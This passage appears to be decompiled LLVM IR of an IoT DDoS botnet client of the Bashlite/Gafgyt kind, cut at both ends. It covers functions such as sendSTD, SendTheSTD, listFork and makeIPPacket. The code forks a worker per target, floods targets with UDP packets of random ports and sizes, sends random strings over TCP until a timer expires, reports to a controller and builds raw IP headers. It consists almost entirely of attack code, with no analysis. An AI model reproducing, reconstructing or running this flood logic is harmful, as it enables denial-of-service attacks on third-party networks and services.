  br label %dec_label_pc_10009044

dec_label_pc_10009034:                            ; preds = %dec_label_pc_10008ff4
  %v2_1000903c = load i32, i32* %v1_10008ffc, align 4
  %v5_10009040 = inttoptr i32 %v2_1000903c to i8*
  br label %dec_label_pc_10009044

dec_label_pc_10009044:                            ; preds = %dec_label_pc_1000901c, %dec_label_pc_10009034
  %storemerge3 = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1002b2a4.372, i32 0, i32 0), %dec_label_pc_1000901c ], [ %v5_10009040, %dec_label_pc_10009034 ]
  %stack_var_-68.0 = phi i32 [ 1, %dec_label_pc_1000901c ], [ 0, %dec_label_pc_10009034 ]
  store i32 268472396, i32* @lr, align 4
  %v1_10009048 = call i32 @__GI_time(i32 0)
  store i32 268472408, i32* @lr, align 4
  %v1_10009054 = call i32 @srand(i32 %v1_10009048)
  %v1_1000905c = add i32 %arg4, 16
  %v1_10009060 = inttoptr i32 %v1_1000905c to i32*
  %v2_10009060 = load i32, i32* %v1_10009060, align 4
  store i32 268472428, i32* @lr, align 4
  %v1_10009068 = call i32 @atol(i32 %v2_10009060)
  %v2_10009074 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_10009074, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 268472456, i32* @lr, align 4
  %v0_10009084 = call i32 @__GI_memset()
  %v1_1000908c = add i32 %arg4, 4
  %v1_10009090 = inttoptr i32 %v1_1000908c to i32*
  %v2_10009090 = load i32, i32* %v1_10009090, align 4
  store i32 268472480, i32* @lr, align 4
  %v3_1000909c = call i32 @host2ip(i32 %arg2, i32 %v2_10009090, i32 %v1_1000908c)
  store i32 2, i32* %stack_var_-44, align 4
  %v3_100090b4 = icmp eq i32 %stack_var_-64.0, 0
  br i1 %v3_100090b4, label %dec_label_pc_100090bc, label %dec_label_pc_100090f8

dec_label_pc_100090bc:                            ; preds = %dec_label_pc_10009044
  %v2_100090c4 = load i32, i32* %v1_10008fcc, align 4
  store i32 268472528, i32* @lr, align 4
  %v1_100090cc = call i32 @atol(i32 %v2_100090c4)
  %v1_100090d4 = urem i32 %v1_100090cc, 65536
  store i32 %v1_100090d4, i32* @r3, align 4
  %v1_100090dc = call i32 @htons(i32 %v1_100090d4)
  %v2_100090f0 = load i32, i32* %v1_10008ffc, align 4
  %v5_100090f4 = inttoptr i32 %v2_100090f0 to i8*
  br label %dec_label_pc_100090f8

dec_label_pc_100090f8:                            ; preds = %dec_label_pc_10009044, %dec_label_pc_100090bc
  %stack_var_-84.0 = phi i8* [ %v5_100090f4, %dec_label_pc_100090bc ], [ %storemerge3, %dec_label_pc_10009044 ]
  %v2_10009100 = load i32, i32* %v1_10009090, align 4
  %v4_10009128 = ptrtoint i8* %stack_var_-84.0 to i32
  store i32 %v4_10009128, i32* @r8, align 4
  %v8_10009130 = call i32 @Send(i32 %arg1, i32 ptrtoint ([49 x i8]* @global_var_1002b2ac.373 to i32), i32 %arg2, i32 %v2_10009100)
  %v3_10009138 = icmp eq i32 %stack_var_-64.0, 1
  %v3_1000916c = icmp eq i32 %stack_var_-68.0, 1
  %v2_10009238 = add i32 %v1_10009068, %v1_10008f58
  br label %dec_label_pc_10009134

dec_label_pc_10009134:                            ; preds = %dec_label_pc_1000924c, %dec_label_pc_100090f8
  %stack_var_-52.0 = phi i32 [ %tmp, %dec_label_pc_100090f8 ], [ %v1_10009250, %dec_label_pc_1000924c ]
  br i1 %v3_10009138, label %dec_label_pc_10009140, label %dec_label_pc_10009168

dec_label_pc_10009140:                            ; preds = %dec_label_pc_10009134
  store i32 268472656, i32* @lr, align 4
  %v2_1000914c = call i32 @realrand(i32 1026, i32 65535)
  %v1_10009154 = urem i32 %v2_1000914c, 65536
  store i32 %v1_10009154, i32* @r3, align 4
  %v1_1000915c = call i32 @htons(i32 %v1_10009154)
  br label %dec_label_pc_10009168

dec_label_pc_10009168:                            ; preds = %dec_label_pc_10009134, %dec_label_pc_10009140
  br i1 %v3_1000916c, label %dec_label_pc_10009174, label %dec_label_pc_10009194

dec_label_pc_10009174:                            ; preds = %dec_label_pc_10009168
  store i32 268472704, i32* @lr, align 4
  %v2_1000917c = call i32 @realrand(i32 64, i32 1024)
  store i32 ptrtoint (i32* @global_var_10009190.374 to i32), i32* @lr, align 4
  %v2_1000918c = call i32 @makeRandomShit(i32 %v0_10008fa8, i32 %v2_1000917c)
  br label %dec_label_pc_100091b8

dec_label_pc_10009194:                            ; preds = %dec_label_pc_10009168
  %v2_1000919c = load i32, i32* %v1_10008ffc, align 4
  store i32 268472744, i32* @lr, align 4
  %v1_100091a4 = call i32 @atol(i32 %v2_1000919c)
  store i32 ptrtoint ([3 x i8]* @global_var_100091b8.375 to i32), i32* @lr, align 4
  %v2_100091b4 = call i32 @makeRandomShit(i32 %v0_10008fa8, i32 %v1_100091a4)
  br label %dec_label_pc_100091b8

dec_label_pc_100091b8:                            ; preds = %dec_label_pc_10009174, %dec_label_pc_10009194
  store i32 268472776, i32* @lr, align 4
  %v3_100091c4 = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_100091d4 = icmp slt i32 %v3_100091c4, 0
  br i1 %v1_100091d4, label %dec_label_pc_10009214, label %dec_label_pc_100091dc

dec_label_pc_100091dc:                            ; preds = %dec_label_pc_100091b8
  store i32 %v0_10008fa8, i32* @r3, align 4
  %v0_100091e4 = call i32 @__GI_strlen()
  store i32 268472844, i32* @lr, align 4
  %v6_10009208 = call i32 @sendto(i32 %v3_100091c4, i32 %v0_10008fa8, i32 %v0_100091e4, i32 0, i32 %v2_10009074, i32 16)
  store i32 268472852, i32* @lr, align 4
  %v1_10009210 = call i32 @close(i32 %v3_100091c4)
  br label %dec_label_pc_10009214

dec_label_pc_10009214:                            ; preds = %dec_label_pc_100091b8, %dec_label_pc_100091dc
  %tmp23 = icmp slt i32 %stack_var_-52.0, 100
  br i1 %tmp23, label %dec_label_pc_1000924c, label %dec_label_pc_10009220

dec_label_pc_10009220:                            ; preds = %dec_label_pc_10009214
  store i32 268472872, i32* @lr, align 4
  %v1_10009224 = call i32 @__GI_time(i32 0)
  %v2_1000923c = icmp ult i32 %v1_10009224, %v2_10009238
  br i1 %v2_1000923c, label %dec_label_pc_10009244, label %dec_label_pc_1000925c

dec_label_pc_10009244:                            ; preds = %dec_label_pc_10009220
  br label %dec_label_pc_1000924c

dec_label_pc_1000924c:                            ; preds = %dec_label_pc_10009214, %dec_label_pc_10009244
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_10009214 ], [ 0, %dec_label_pc_10009244 ]
  %v1_10009250 = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_10009134

dec_label_pc_1000925c:                            ; preds = %dec_label_pc_10009220
  store i32 ptrtoint ([3 x i8]* @global_var_10009264.376 to i32), i32* @lr, align 4
  %v1_10009260 = call i32 @close(i32 %v3_100091c4)
  %v0_10009268 = call i32 @__GI_exit()
  br label %dec_label_pc_1000926c

dec_label_pc_1000926c:                            ; preds = %dec_label_pc_10008f90, %dec_label_pc_1000925c
  %v0_10009280 = phi i32 [ %v1_10008f94, %dec_label_pc_10008f90 ], [ %v0_10009268, %dec_label_pc_1000925c ]
  ret i32 %v0_10009280

; uselistorder directives
  uselistorder i32 %v1_10009154, { 1, 0 }
  uselistorder i32 %v1_100090d4, { 1, 0 }
  uselistorder i32* %v1_10008ffc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10008fa8, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @host2ip, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002b2a0.371 to i32), { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000926c, { 1, 0 }
  uselistorder label %dec_label_pc_1000924c, { 1, 0 }
  uselistorder label %dec_label_pc_10009214, { 1, 0 }
  uselistorder label %dec_label_pc_100091b8, { 1, 0 }
  uselistorder label %dec_label_pc_10009168, { 1, 0 }
  uselistorder label %dec_label_pc_100090f8, { 1, 0 }
  uselistorder label %dec_label_pc_10009044, { 1, 0 }
  uselistorder label %dec_label_pc_10008ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10008f90, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268472988, i32* @lr, align 4
  %v0_10009298 = call i32 @fork()
  %v3_100092a8 = icmp eq i32 %v0_10009298, 0
  br i1 %v3_100092a8, label %dec_label_pc_1000939c, label %dec_label_pc_100092bc

dec_label_pc_100092bc:                            ; preds = %entry
  %v3_100092c0 = load i32, i32* @global_var_1004517c.27, align 4
  %v1_100092c4 = add i32 %v3_100092c0, 1
  store i32 %v1_100092c4, i32* @global_var_1004517c.27, align 4
  %v1_100092d8 = mul i32 %v1_100092c4, 4
  %v1_100092dc = add i32 %v1_100092d8, 4
  store i32 %v1_100092dc, i32* @r3, align 4
  store i32 268473064, i32* @lr, align 4
  %v0_100092e4 = call i32 @malloc()
  %v3_100093404 = load i32, i32* @global_var_1004517c.27, align 4
  %v3_1000934c6 = icmp eq i32 %v3_100093404, 1
  br i1 %v3_1000934c6, label %dec_label_pc_10009354, label %dec_label_pc_100092fc

dec_label_pc_100092fc:                            ; preds = %dec_label_pc_100092bc, %dec_label_pc_100092fc
  %storemerge28 = phi i32 [ %v1_10009334, %dec_label_pc_100092fc ], [ 0, %dec_label_pc_100092bc ]
  %v1_10009300 = mul i32 %storemerge28, 4
  %v2_1000930c = add i32 %v1_10009300, %v0_100092e4
  store i32 %v2_1000930c, i32* @r10, align 4
  %v3_10009320 = load i32, i32* @global_var_100451cc.28, align 4
  %v2_10009324 = add i32 %v3_10009320, %v1_10009300
  %v1_10009328 = inttoptr i32 %v2_10009324 to i32*
  %v2_10009328 = load i32, i32* %v1_10009328, align 4
  %v2_1000932c = inttoptr i32 %v2_1000930c to i32*
  store i32 %v2_10009328, i32* %v2_1000932c, align 4
  %v1_10009334 = add i32 %storemerge28, 1
  %v3_10009340 = load i32, i32* @global_var_1004517c.27, align 4
  %v1_10009344 = add i32 %v3_10009340, -1
  %v3_1000934c = icmp ugt i32 %v1_10009344, %v1_10009334
  br i1 %v3_1000934c, label %dec_label_pc_100092fc, label %dec_label_pc_1000933c.dec_label_pc_10009354_crit_edge

dec_label_pc_1000933c.dec_label_pc_10009354_crit_edge: ; preds = %dec_label_pc_100092fc
  br label %dec_label_pc_10009354

dec_label_pc_10009354:                            ; preds = %dec_label_pc_100092bc, %dec_label_pc_1000933c.dec_label_pc_10009354_crit_edge
  %v3_10009358 = phi i32 [ %v3_10009340, %dec_label_pc_1000933c.dec_label_pc_10009354_crit_edge ], [ %v3_100093404, %dec_label_pc_100092bc ]
  %v1_1000935c = mul i32 %v3_10009358, 4
  %v2_10009368 = add i32 %v0_100092e4, -4
  %v1_1000936c = add i32 %v2_10009368, %v1_1000935c
  %v2_10009374 = inttoptr i32 %v1_1000936c to i32*
  store i32 %v0_10009298, i32* %v2_10009374, align 4
  %v3_1000937c = load i32, i32* @global_var_100451cc.28, align 4
  store i32 %v3_1000937c, i32* @r3, align 4
  store i32 268473224, i32* @lr, align 4
  %v0_10009384 = call i32 @free()
  store i32 %v0_100092e4, i32* @global_var_100451cc.28, align 4
  br label %dec_label_pc_1000939c

dec_label_pc_1000939c:                            ; preds = %entry, %dec_label_pc_10009354
  ret i32 %v0_10009298

; uselistorder directives
  uselistorder i32 %v1_10009334, { 1, 0 }
  uselistorder i32 %v1_10009300, { 1, 0 }
  uselistorder i32 %storemerge28, { 1, 0 }
  uselistorder i32 %v3_100093404, { 1, 0 }
  uselistorder i32 %v0_100092e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000939c, { 1, 0 }
  uselistorder label %dec_label_pc_10009354, { 1, 0 }
  uselistorder label %dec_label_pc_100092fc, { 1, 0 }
}

define i32 @SendTheSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  store i32 268473324, i32* @lr, align 4
  %v3_100093e8 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268473340, i32* @lr, align 4
  %v1_100093f8 = call i32 @__GI_time(i32 0)
  store i32 268473360, i32* @lr, align 4
  %v1_1000940c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10009418 = ptrtoint i32* %stack_var_-368 to i32
  store i32 0, i32* %stack_var_-368, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v1_10009440 = add i32 %v1_1000940c, 16
  %v2_10009440 = inttoptr i32 %v1_10009440 to i32*
  %v3_10009440 = load i32, i32* %v2_10009440, align 4
  %v1_10009444 = inttoptr i32 %v3_10009440 to i32*
  %v2_10009444 = load i32, i32* %v1_10009444, align 4
  %v2_1000944c = ptrtoint i32* %stack_var_-364 to i32
  %v1_10009454 = add i32 %v1_1000940c, 12
  %v2_10009454 = inttoptr i32 %v1_10009454 to i32*
  %v3_10009454 = load i32, i32* %v2_10009454, align 4
  store i32 %v3_10009454, i32* @r5, align 4
  store i32 268473448, i32* @lr, align 4
  %v4_10009464 = call i32 @bcopy(i32 %v2_10009444, i32 %v2_1000944c, i32 %v3_10009454, i32 %v1_1000940c)
  %v1_1000946c = add i32 %v1_1000940c, 8
  %v2_1000946c = inttoptr i32 %v1_1000946c to i32*
  %v3_1000946c = load i32, i32* %v2_1000946c, align 4
  %v1_10009470 = urem i32 %v3_1000946c, 65536
  store i32 %v1_10009470, i32* %stack_var_-368, align 4
  %v2_10009494 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10009494, i32* @r3, align 4
  store i32 ptrtoint ([79 x i8*]* @global_var_1002b878.456 to i32), i32* @r4, align 4
  store i32 316, i32* @r5, align 4
  store i32 268473516, i32* @lr, align 4
  %v0_100094a8 = call i32 @memcpy()
  %v3_100094b0 = icmp eq i32 %arg2, 0
  %v2_10009514 = ptrtoint i32* %stack_var_-392 to i32
  %v2_10009518 = add i32 %v2_10009514, 40
  %v2_10009588 = add i32 %v1_100093f8, %arg3
  br label %dec_label_pc_100094ac

dec_label_pc_100094ac:                            ; preds = %dec_label_pc_100095ac, %entry
  %stack_var_-388.0 = phi i32 [ 0, %entry ], [ %v1_100095b0, %dec_label_pc_100095ac ]
  br i1 %v3_100094b0, label %dec_label_pc_100094b8, label %dec_label_pc_100094dc

dec_label_pc_100094b8:                            ; preds = %dec_label_pc_100094ac
  store i32 268473544, i32* @lr, align 4
  %v2_100094c4 = call i32 @realrand(i32 1, i32 65535)
  br label %dec_label_pc_100094dc

dec_label_pc_100094dc:                            ; preds = %dec_label_pc_100094ac, %dec_label_pc_100094b8
  %storemerge4 = phi i32 [ %v2_100094c4, %dec_label_pc_100094b8 ], [ %arg2, %dec_label_pc_100094ac ]
  store i32 %storemerge4, i32* %stack_var_-392, align 4
  store i32 268473568, i32* @lr, align 4
  %v0_100094dc = call i32 @random()
  %v1_100094f4 = urem i32 %v0_100094dc, 79
  %v1_10009510 = mul nuw nsw i32 %v1_100094f4, 4
  %v1_1000951c = add i32 %v2_10009518, %v1_10009510
  %v1_10009520 = inttoptr i32 %v1_1000951c to i32*
  %v2_10009520 = load i32, i32* %v1_10009520, align 4
  store i32 268473672, i32* @lr, align 4
  %v3_10009544 = call i32 @connect(i32 %v3_100093e8, i32 %v2_10009418, i32 16)
  store i32 %v2_10009520, i32* @r3, align 4
  %v0_1000954c = call i32 @__GI_strlen()
  store i32 268473704, i32* @lr, align 4
  %v5_10009564 = call i32 @send(i32 %v3_100093e8, i32 %v2_10009520, i32 %v0_1000954c, i32 0)
  %tmp25 = icmp ult i32 %stack_var_-388.0, 100
  br i1 %tmp25, label %dec_label_pc_100095ac, label %dec_label_pc_10009574

dec_label_pc_10009574:                            ; preds = %dec_label_pc_100094dc
  store i32 268473724, i32* @lr, align 4
  %v1_10009578 = call i32 @__GI_time(i32 0)
  %v2_1000958c = icmp slt i32 %v1_10009578, %v2_10009588
  br i1 %v2_1000958c, label %dec_label_pc_100095a4, label %dec_label_pc_10009594

dec_label_pc_10009594:                            ; preds = %dec_label_pc_10009574
  store i32 ptrtoint ([3 x i8]* @global_var_1000959c.457 to i32), i32* @lr, align 4
  %v1_10009598 = call i32 @close(i32 %v3_100093e8)
  %v1_100095a0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100095a4

dec_label_pc_100095a4:                            ; preds = %dec_label_pc_10009574, %dec_label_pc_10009594
  br label %dec_label_pc_100095ac

dec_label_pc_100095ac:                            ; preds = %dec_label_pc_100094dc, %dec_label_pc_100095a4
  %stack_var_-388.1 = phi i32 [ %stack_var_-388.0, %dec_label_pc_100094dc ], [ 0, %dec_label_pc_100095a4 ]
  %v1_100095b0 = add i32 %stack_var_-388.1, 1
  br label %dec_label_pc_100094ac

; uselistorder directives
  uselistorder i32 %v3_10009454, { 1, 0 }
  uselistorder i32 %v1_1000940c, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-364, { 1, 0 }
  uselistorder label %dec_label_pc_100095ac, { 1, 0 }
  uselistorder label %dec_label_pc_100095a4, { 1, 0 }
  uselistorder label %dec_label_pc_100094dc, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_100095e4 = call i32 @mfork(i32 %arg2)
  %v3_100095ec = icmp eq i32 %v1_100095e4, 0
  br i1 %v3_100095ec, label %dec_label_pc_100095f4, label %dec_label_pc_10009788

dec_label_pc_100095f4:                            ; preds = %entry
  %v2_100095f8 = icmp sgt i32 %arg3, 2
  br i1 %v2_100095f8, label %dec_label_pc_10009620, label %dec_label_pc_10009600

dec_label_pc_10009600:                            ; preds = %dec_label_pc_100095f4
  %v6_10009614 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1002b9bc.459 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000961c = call i32 @__GI_exit()
  br label %dec_label_pc_10009620

dec_label_pc_10009620:                            ; preds = %dec_label_pc_100095f4, %dec_label_pc_10009600
  %v1_10009624 = add i32 %arg4, 4
  %v1_10009628 = inttoptr i32 %v1_10009624 to i32*
  %v2_10009628 = load i32, i32* %v1_10009628, align 4
  %v1_10009634 = add i32 %arg4, 8
  %v1_10009638 = inttoptr i32 %v1_10009634 to i32*
  %v2_10009638 = load i32, i32* %v1_10009638, align 4
  store i32 268473924, i32* @lr, align 4
  %v1_10009640 = call i32 @atol(i32 %v2_10009638)
  %v1_10009650 = add i32 %arg4, 12
  %v1_10009654 = inttoptr i32 %v1_10009650 to i32*
  %v2_10009654 = load i32, i32* %v1_10009654, align 4
  store i32 268473952, i32* @lr, align 4
  %v1_1000965c = call i32 @atol(i32 %v2_10009654)
  store i32 %v2_10009628, i32* @r3, align 4
  store i32 268473976, i32* @lr, align 4
  %v2_10009674 = call i32 @__GI_strchr(i32 %v2_10009628, i32 44)
  %v3_1000967c = icmp eq i32 %v2_10009674, 0
  br i1 %v3_1000967c, label %dec_label_pc_10009720, label %dec_label_pc_10009684

dec_label_pc_10009684:                            ; preds = %dec_label_pc_10009620
  store i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32* @r4, align 4
  store i32 268474008, i32* @lr, align 4
  %v4_10009694 = call i32 @__GI_strtok(i32 %v2_10009628, i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_100097145 = icmp eq i32 %v4_10009694, 0
  br i1 %v3_100097145, label %dec_label_pc_10009788, label %dec_label_pc_100096a4

dec_label_pc_100096a4:                            ; preds = %dec_label_pc_10009684, %dec_label_pc_100096f8
  %storemerge26 = phi i32 [ %v4_10009704, %dec_label_pc_100096f8 ], [ %v4_10009694, %dec_label_pc_10009684 ]
  store i32 268474024, i32* @lr, align 4
  %v0_100096a4 = call i32 @listFork()
  %v3_100096ac = icmp eq i32 %v0_100096a4, 0
  br i1 %v3_100096ac, label %dec_label_pc_100096b4, label %dec_label_pc_100096f8

dec_label_pc_100096b4:                            ; preds = %dec_label_pc_100096a4
  %v7_100096dc = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002b9e0.461 to i32), i32 %arg2, i32 %storemerge26)
  %v3_100096ec = call i32 @SendTheSTD(i32 %storemerge26, i32 %v1_10009640, i32 %v1_1000965c)
  %v1_100096f4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100096f8

dec_label_pc_100096f8:                            ; preds = %dec_label_pc_100096a4, %dec_label_pc_100096b4
  store i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32* @r4, align 4
  store i32 268474120, i32* @lr, align 4
  %v4_10009704 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_10009714 = icmp eq i32 %v4_10009704, 0
  br i1 %v3_10009714, label %dec_label_pc_10009788, label %dec_label_pc_100096a4

dec_label_pc_10009720:                            ; preds = %dec_label_pc_10009620
  store i32 268474148, i32* @lr, align 4
  %v0_10009720 = call i32 @listFork()
  %v3_10009728 = icmp eq i32 %v0_10009720, 0
  br i1 %v3_10009728, label %dec_label_pc_10009738, label %dec_label_pc_10009730

dec_label_pc_10009730:                            ; preds = %dec_label_pc_10009720
  %v0_10009734 = call i32 @__GI_exit()
  br label %dec_label_pc_10009738

dec_label_pc_10009738:                            ; preds = %dec_label_pc_10009720, %dec_label_pc_10009730
  %v2_10009740 = load i32, i32* %v1_10009628, align 4
  %v7_1000976c = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002b9e0.461 to i32), i32 %arg2, i32 %v2_10009740)
  %v3_1000977c = call i32 @SendTheSTD(i32 %v2_10009628, i32 %v1_10009640, i32 %v1_1000965c)
  %v1_10009784 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10009788

dec_label_pc_10009788:                            ; preds = %dec_label_pc_100096f8, %dec_label_pc_10009684, %entry, %dec_label_pc_10009738
  %v0_1000979c = phi i32 [ %v1_100095e4, %entry ], [ %v1_10009784, %dec_label_pc_10009738 ], [ 0, %dec_label_pc_10009684 ], [ 0, %dec_label_pc_100096f8 ]
  ret i32 %v0_1000979c

; uselistorder directives
  uselistorder i32 %v4_10009704, { 1, 0 }
  uselistorder i32 %storemerge26, { 1, 0 }
  uselistorder i32 %v1_1000965c, { 1, 0 }
  uselistorder i32 %v1_10009640, { 1, 0 }
  uselistorder i32 %v2_10009628, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @SendTheSTD, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009788, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009738, { 1, 0 }
  uselistorder label %dec_label_pc_100096f8, { 1, 0 }
  uselistorder label %dec_label_pc_100096a4, { 1, 0 }
  uselistorder label %dec_label_pc_10009620, { 1, 0 }
}

define i32 @get_iface_ip(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  store i32 268474316, i32* @lr, align 4
  %v3_100097c8 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_100097dc = ptrtoint i32* %stack_var_-64 to i32
  store i32 %arg2, i32* @r4, align 4
  store i32 268474352, i32* @lr, align 4
  %v3_100097ec = call i32 @strncpy(i32 %v2_100097dc, i32 %arg2, i32 15)
  store i32 %v3_100097c8, i32* @r3, align 4
  store i32 35093, i32* @r4, align 4
  store i32 %v2_100097dc, i32* @r5, align 4
  store i32 268474380, i32* @lr, align 4
  %v0_10009808 = call i32 @ioctl()
  %v3_10009818 = icmp eq i32 %v0_10009808, 0
  br i1 %v3_10009818, label %dec_label_pc_1000982c, label %dec_label_pc_1000985c

dec_label_pc_1000982c:                            ; preds = %entry
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 268474420, i32* @lr, align 4
  %v1_10009830 = call i32 @close(i32 %v3_100097c8)
  store i16 2, i16* %arg1, align 2
  %v2_10009850 = add i32 %tmp, 4
  %v3_10009850 = inttoptr i32 %v2_10009850 to i32*
  br label %dec_label_pc_1000985c

dec_label_pc_1000985c:                            ; preds = %entry, %dec_label_pc_1000982c
  %storemerge = phi i32 [ 1, %dec_label_pc_1000982c ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_1000985c, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268474532, i32* @lr, align 4
  %v1_100098a0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_100098a0, i32* %arg2, align 4
  %v4_100098bc = icmp eq i32 %v1_100098a0, -1
  %. = zext i1 %v4_100098bc to i32
  ret i32 %.
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_10009930 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10009930, i32* %arg1, align 4
  %v1_10009944 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10009944, i32* %arg1, align 4
  %v3_10009954 = add i32 %tmp1, 1
  %v4_10009954 = inttoptr i32 %v3_10009954 to i8*
  store i8 0, i8* %v4_10009954, align 1
  %fold = add i32 %arg5, 20
  %v1_1000996c = trunc i32 %fold to i16
  %v3_1000996c = add i32 %tmp1, 2
  %v4_1000996c = inttoptr i32 %v3_1000996c to i16*
  store i16 %v1_1000996c, i16* %v4_1000996c, align 2
  %v0_10009970 = call i32 @rand_cmwc()
  %v1_10009980 = trunc i32 %v0_10009970 to i16
  %v3_10009980 = add i32 %tmp1, 4
  %v4_10009980 = inttoptr i32 %v3_10009980 to i16*
  store i16 %v1_10009980, i16* %v4_10009980, align 2
  %v3_1000998c = add i32 %tmp1, 6
  %v4_1000998c = inttoptr i32 %v3_1000998c to i16*
  store i16 0, i16* %v4_1000998c, align 2
  %v3_10009998 = add i32 %tmp1, 8
  %v4_10009998 = inttoptr i32 %v3_10009998 to i8*
  store i8 -1, i8* %v4_10009998, align 1
  %v3_100099a4 = add i32 %tmp1, 9
  %v4_100099a4 = inttoptr i32 %v3_100099a4 to i8*
  store i8 %tmp, i8* %v4_100099a4, align 1
  %v3_100099b0 = add i32 %tmp1, 10
  %v4_100099b0 = inttoptr i32 %v3_100099b0 to i16*
  store i16 0, i16* %v4_100099b0, align 2
  %v2_100099bc = add i32 %tmp1, 12
  %v3_100099bc = inttoptr i32 %v2_100099bc to i32*
  store i32 %arg3, i32* %v3_100099bc, align 4
  %v2_100099c8 = add i32 %tmp1, 16
  %v3_100099c8 = inttoptr i32 %v2_100099c8 to i32*
  store i32 %arg2, i32* %v3_100099c8, align 4
  ret i32 %v0_10009970
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100099f8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_10009a04 = icmp eq i32 %v0_100099f8, 0
  br i1 %v3_10009a04, label %dec_label_pc_10009a38, label %dec_label_pc_10009a0c

dec_label_pc_10009a0c:                            ; preds = %entry
  %v1_10009a10 = inttoptr i32 %v0_100099f8 to i32*
  %v2_10009a10 = load i32, i32* %v1_10009a10, align 4
  %v1_10009a1c = trunc i32 %arg2 to i8
  %v3_10009a1c = inttoptr i32 %v2_10009a10 to i8*
  store i8 %v1_10009a1c, i8* %v3_10009a1c, align 1
  %v2_10009a24 = load i32, i32* %v1_10009a10, align 4
  %v1_10009a28 = add i32 %v2_10009a24, 1
  store i32 %v1_10009a28, i32* %v1_10009a10, align 4
  %v0_10009a60.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009a4c

dec_label_pc_10009a38:                            ; preds = %entry
  %v2_10009a38 = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268474956, i32* @lr, align 4
  %v3_10009a48 = call i32 @write(i32 1, i32 %v2_10009a38, i32 1)
  store i32 %v3_10009a48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009a4c

dec_label_pc_10009a4c:                            ; preds = %dec_label_pc_10009a0c, %dec_label_pc_10009a38
  %v0_10009a60 = phi i32 [ %v0_10009a60.pre, %dec_label_pc_10009a0c ], [ %v3_10009a48, %dec_label_pc_10009a38 ]
  ret i32 %v0_10009a60

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009a4c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp45 = icmp slt i32 %arg3, 1
  br i1 %tmp45, label %dec_label_pc_10009b28, label %dec_label_pc_10009aa4

dec_label_pc_10009aa4:                            ; preds = %entry
